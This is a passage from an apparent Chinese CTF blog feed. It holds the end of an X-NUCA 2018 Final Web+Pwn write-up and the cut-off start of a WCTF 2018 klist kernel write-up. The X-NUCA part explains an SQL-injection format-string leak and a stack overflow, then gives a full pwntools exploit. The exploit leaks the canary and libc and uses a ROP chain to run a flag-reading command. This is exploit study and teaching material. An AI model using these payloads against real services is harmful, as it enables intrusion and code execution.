class="built_in">printf</span>(*v20);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"(Nil)"</span>);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    mysql_free_result(v19);</span><br><span class="line">    mysql_close(v17);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>而从mysql中出来的数据如何存在格式化数据呢，队里Manasseh Zhou师傅给了我一个payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buf =<span class="string">"""POST /cart.html?cargo=-1); HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: 127.0.0.1\r</span></span><br><span class="line"><span class="string">User-Agent: ComputerVendor\r</span></span><br><span class="line"><span class="string">Cookie: nilnilnilnil\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Identity: unknown\r</span></span><br><span class="line"><span class="string">Content-Length: 10\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">a=1&amp;cargo=1) union select '%75$p' ;# &amp;"""</span></span><br></pre></td></tr></table></figure><p>这样就可以构造出格式化的字符串了，有了这个功能可以泄露任意内容，虽然每次程序发送一个数据包以后都会断掉连接，但是由于这个处理功能是fork出来的，因此每次泄露的内容都是不变的。</p><p>有了一大堆泄露的数据后该如何下一步攻击呢？</p><p>再看另外一个功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(haystack + <span class="number">1</span>, <span class="string">"product.html"</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;arg_start; i &lt; &amp;content_start; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == &amp;arg_start )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = strtok(qword_60F450, <span class="string">"="</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v14 = strtok(<span class="number">0L</span>L, <span class="string">"&amp;"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v14 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = strtok(<span class="number">0L</span>L, <span class="string">"="</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v14 = strtok(<span class="number">0L</span>L, <span class="string">"&amp;"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v14 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *i = v13;</span><br><span class="line">    i[<span class="number">1</span>] = v14;</span><br><span class="line">  &#125;</span><br><span class="line">  v21 = (<span class="keyword">char</span> *)search_from_arg(<span class="string">"id"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = sub_402A21();</span><br><span class="line">    v3 = <span class="built_in">strlen</span>(<span class="string">"SELECT * FROM cargo where cargo_id="</span>);</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(v21);</span><br><span class="line">    dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v3 + v4 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, <span class="string">"SELECT * FROM cargo where cargo_id="</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(dest, v21);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)mysql_query(v22, dest) )</span><br><span class="line">      sub_402AD7(v22);</span><br><span class="line">    v23 = mysql_store_result(v22);</span><br><span class="line">    <span class="keyword">if</span> ( !v23 )</span><br><span class="line">      sub_402AD7(v22);</span><br><span class="line">    v11 = mysql_num_fields(v23);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = mysql_fetch_row(v23);</span><br><span class="line">      <span class="keyword">if</span> ( !v24 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v11; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = (_QWORD *)mysql_fetch_field(v23);</span><br><span class="line">            <span class="keyword">if</span> ( !v25 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s "</span>, *v25);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)(<span class="number">8L</span>L * j + v24) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(<span class="number">8L</span>L * j + v24), <span class="string">"overdue"</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v6 = <span class="built_in">strlen</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(<span class="number">8L</span>L * j + v24));</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;v26, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(<span class="number">8L</span>L * j + v24), v6 + <span class="number">64</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v7 = <span class="built_in">strlen</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(<span class="number">8L</span>L * j + v24));</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;v26, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(<span class="number">8L</span>L * j + v24), v7);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span>(&amp;v26, <span class="string">"(Nil)"</span>, <span class="number">5u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s "</span>, &amp;v26);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_free_result(v23);</span><br><span class="line">    mysql_close(v22);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个功能存在一个明显的问题，当查询结果出现overdue字样时，会向栈上拷贝查询结果+64的内存数据，妥妥的栈溢出。不过仍然有坑点，就是mysql查询结果都是字符串，而栈溢出出现利用必须有如0x00007f12345678这样的地址。</p><p>虽然可以通过union注入，可以通过类似于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="string">'aaa...aa'</span>,canary+<span class="string">'aaa...aa'</span>,onegadget[:<span class="number">-2</span>],<span class="string">''</span></span><br></pre></td></tr></table></figure><p>这样的方法使返回地址覆盖为onegadget，但是并没有用，因为程序没有输入，得到这个情况，只能使这个进程卡死，第一天晚上就卡在这里了。//最初以为可以DoS搅屎，发现并不能</p><p>第二天下午的时候 ，突然想起是否可以让mysql返回存在\x0000这样的数据，Manasseh Zhou提示我可以用unhex，来绕过截断限制，突然发现这样就可以写ROP了。</p><p>ROP由于复制长度限制，只能写0x20长，因此好多东西都搞不了，最后想到可以用system(“cat /opt/xnuca/flag.txt”)这样的命令来拿到flag。</p><p>但苦于没有合适的位置来构造，只有堆上有这样一条数据，但还加了一个单引号，因为是在SQL语句中，执行system时会卡死等待另一个单引号。</p><p>后来想到可以用SQL语句注释的规则来增加一个单引号绕过system执行限制，如用这样的SQL语句：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 'overdueaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',canary data,ROP,'cat /opt/xnuca/flag.txt;echo ';#'</span><br></pre></td></tr></table></figure><p>这样最终会执行system(“cat /opt/xnuca/flag.txt;echo ‘;#’”)</p><p>就可以拿到flag了，最终的结果是一个ROP写一年，比赛结束后才写完这个ROP……（马后炮体质）</p><h3 id="EXP2-py"><a href="#EXP2-py" class="headerlink" title="EXP2.py"></a>EXP2.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span><span class="params">(libc_addr,heap)</span>:</span></span><br><span class="line">rop = <span class="string">''</span></span><br><span class="line">rop += p64(libc_addr + <span class="number">0x0000000000021102</span>)</span><br><span class="line"></span><br><span class="line">rop += p64(heap+<span class="number">392</span>)</span><br><span class="line">rop += p64(libc_addr + <span class="number">283536</span>)</span><br><span class="line"><span class="comment">#rop += p64(libc_addr + 0x0000000000021102)</span></span><br><span class="line"><span class="comment">#rop += p64(heap+415)</span></span><br><span class="line"><span class="comment">#rop += p64(libc_addr + 0x000000000003a7a0)</span></span><br><span class="line"><span class="comment">#rop += p64(1)</span></span><br><span class="line"><span class="comment">#0x000000000003a7a0 : mov dword ptr [rdi], 0 ; xor eax, eax ; pop rbx ; ret</span></span><br><span class="line"><span class="comment">#rop += p64(libc_addr + 0x00000000000202e8)</span></span><br><span class="line"><span class="comment">#rop += p64(1)</span></span><br><span class="line"><span class="comment">#rop += p64(libc_addr + 0x0000000000001b92)</span></span><br><span class="line"><span class="comment">#rop += p64(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop += p64(libc_addr + 586160)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">rop += p64(libc_addr + 0x0000000000021102)</span></span><br><span class="line"><span class="string">rop += p64(heap+392)</span></span><br><span class="line"><span class="string">rop += p64(libc_addr + 0x6f690)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#rop += p64(libc_addr + 0x6f690)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">rop += p64(libc_addr + 0x0000000000021102)</span></span><br><span class="line"><span class="string">rop += p64(heap+390)</span></span><br><span class="line"><span class="string">rop += p64(libc_addr + 0x6f690)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000021102 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x00000000000202e8 : pop rsi ; ret</span></span><br><span class="line"><span class="comment">#0x0000000000001b92 : pop rdx ; ret</span></span><br><span class="line"><span class="comment">#rop += p64(libc_addr+0x45216)</span></span><br><span class="line"><span class="comment"># strncpy 0x8d3c0</span></span><br><span class="line">a = <span class="string">"unhex('%s')"</span>%rop.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">p = remote(ip,<span class="number">8080</span>)</span><br><span class="line">buf =<span class="string">"""POST /cart.html?cargo=-1); HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: 127.0.0.1\r</span></span><br><span class="line"><span class="string">User-Agent: ComputerVendor\r</span></span><br><span class="line"><span class="string">Cookie: nilnilnilnil\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Identity: unknown\r</span></span><br><span class="line"><span class="string">Content-Length: 10\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">a=1&amp;cargo=1) union select '%41$p' ;# &amp;"""</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.send(buf)</span><br><span class="line">p.recvuntil(<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line">canary = int(p.recvuntil(<span class="string">'00'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]canary'</span>,hex(canary)</span><br><span class="line"></span><br><span class="line">p = remote(ip,<span class="number">8080</span>)</span><br><span class="line">buf =<span class="string">"""POST /cart.html?cargo=-1); HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: 127.0.0.1\r</span></span><br><span class="line"><span class="string">User-Agent: ComputerVendor\r</span></span><br><span class="line"><span class="string">Cookie: nilnilnilnil\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Identity: unknown\r</span></span><br><span class="line"><span class="string">Content-Length: 10\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">a=1&amp;cargo=1) union select '%44$p' ;# &amp;"""</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.send(buf)</span><br><span class="line">p.recvuntil(<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]canary'</span>,hex(stack)</span><br><span class="line">p = remote(ip,<span class="number">8080</span>)</span><br><span class="line">buf =<span class="string">"""POST /cart.html?cargo=-1); HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: 127.0.0.1\r</span></span><br><span class="line"><span class="string">User-Agent: ComputerVendor\r</span></span><br><span class="line"><span class="string">Cookie: nilnilnilnil\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Identity: unknown\r</span></span><br><span class="line"><span class="string">Content-Length: 10\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">a=1&amp;cargo=1) union select '%7$p' ;# &amp;"""</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.send(buf)</span><br><span class="line">p.recvuntil(<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line">heap = int(p.recv(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]heap'</span>,hex(heap)</span><br><span class="line"></span><br><span class="line">p = remote(ip,<span class="number">8080</span>)</span><br><span class="line"></span><br><span class="line">p = remote(ip,<span class="number">8080</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf =<span class="string">"""POST /cart.html?cargo=-1); HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: 127.0.0.1\r</span></span><br><span class="line"><span class="string">User-Agent: ComputerVendor\r</span></span><br><span class="line"><span class="string">Cookie: nilnilnilnil\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Identity: unknown\r</span></span><br><span class="line"><span class="string">Content-Length: 10\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">a=1&amp;cargo=1) union select '%75$p' ;# &amp;"""</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.send(buf)</span><br><span class="line">p.recvuntil(<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line">libc_addr = int(p.recvuntil(<span class="string">'30'</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]libc_addr'</span>,hex(libc_addr)</span><br><span class="line"></span><br><span class="line">p = remote(ip,<span class="number">8080</span>)</span><br><span class="line"></span><br><span class="line">buf =<span class="string">"""POST /cart.html?product.html HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: 127.0.0.1\r</span></span><br><span class="line"><span class="string">User-Agent: ComputerVendor\r</span></span><br><span class="line"><span class="string">Cookie: nilnilnilnil\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Identity: unknown\r</span></span><br><span class="line"><span class="string">Content-Length: 100\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">a=1&amp;id=1&amp;"""</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.send(buf)</span><br><span class="line">p.recvuntil(<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(ip,<span class="number">8080</span>)</span><br><span class="line"></span><br><span class="line">buf =<span class="string">"""POST /product.html? HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: 127.0.0.1\r</span></span><br><span class="line"><span class="string">User-Agent: ComputerVendor\r</span></span><br><span class="line"><span class="string">Cookie: nilnilnilnil\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Identity: unknown\r</span></span><br><span class="line"><span class="string">Content-Length: 100\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">a=1&amp;id=111 union select 'overdueaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','%s',%s,'cat /opt/xnuca/flag.txt;echo ';#'&amp;"""</span>%(p64(canary).replace(<span class="string">'\0'</span>,<span class="string">''</span>)+<span class="string">'aaaaaaaaaaaaaaaaaaaaaaa'</span>,build_rop(libc_addr,heap) )<span class="comment">#p64(libc_addr+0x45216).replace('\0',''))</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p.send(buf)</span><br><span class="line"><span class="comment">#p.recvuntil('&lt;/html&gt;')</span></span><br><span class="line"><span class="comment">#print '[+]',p64(canary)[1:]</span></span><br><span class="line"><span class="comment">#print '[+++]',len(buf)</span></span><br><span class="line">p.recvuntil(<span class="string">'cat /opt/xnuca/flag.txt;echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">flag = p.recvline()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] flag'</span>,flag</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x0000000000021102 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000202e8 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000001b92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x6f690 puts\</span></span><br><span class="line"><span class="string">0x18cd57 /bin/sh</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0xf02a4execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0xf1147execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      此题是X-NUCA&#39;2018 Final的一道题目，是一道Web&amp;Pwn题目，第一次做出此类题目，记录题目两种解法。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【KERNEL PWN】WCTF 2018 klist解题思路</title>
    <link href="http://p4nda.top/2018/11/27/wctf-2018-klist/"/>
    <id>http://p4nda.top/2018/11/27/wctf-2018-klist/</id>
    <published>2018-11-27T01:56:45.000Z</published>
    <updated>2018-12-03T04:17:59.979Z</updated>
    
    <content type="html"><![CDATA[<p>题目来源于WCTF 2018，shellphish出的一道比较简单的内核题目，苦于比赛时并不会内核，到今天才重新拿出来复现，附件及题目<a href="https://github.com/ret2p4nda/kernel-pwn/tree/master/klist" target="_blank" rel="noopener">下载</a>。</p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目模仿磁盘文件机制，可以自由申请、释放、读写堆块。提供了read、write、ioctl三个功能。</p><p>其堆块数据结构如下，其中isuse位是一个标志位，使用原子操作对其加减，每次操作前加一，操作后减一，当该位为0时，调用kfree释放。size为存放的是其大小，fd是下一个item的指针，后续是其实际内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> struct_item     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_3)</span><br><span class="line"><span class="number">00000000</span> isuse           dd ?</span><br><span class="line"><span class="number">00000004</span> field_4         dd ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> fd              dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> buf             dq ?</span><br><span class="line"><span class="number">00000020</span> struct_item     ends</span><br></pre></td></tr></table></figure><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>在ioctl里实现了4个功能</p><h3 id="add-item"><a href="#add-item" class="headerlink" title="add_item"></a>add_item</h3><p>可以看到，从copy_from_user可看出，其输入的参数是一个结构体，结构体有两项一个是size，一个是数据buf指针。然后程序会按照请求的size+0x18，kmalloc申请内存，并复制过去，将内存挂在单链表上，并将isuse位置1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">add_item</span><span class="params">(add_opt *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  struct_item *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  struct_item *v4; <span class="comment">// rbx</span></span><br><span class="line">  struct_item *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  add_opt v7; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;v7, a1, <span class="number">16L</span>L) || v7.size &gt; <span class="number">0x400</span>uLL )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22L</span>L;</span><br><span class="line">  v1 = (struct_item *)_kmalloc(v7.size + <span class="number">0x18</span>, <span class="number">0x14202C0</span>LL);<span class="comment">// ___GFP_FS|___GFP_IO|___GFP_NOWARN   |___GFP_HARDWALL|   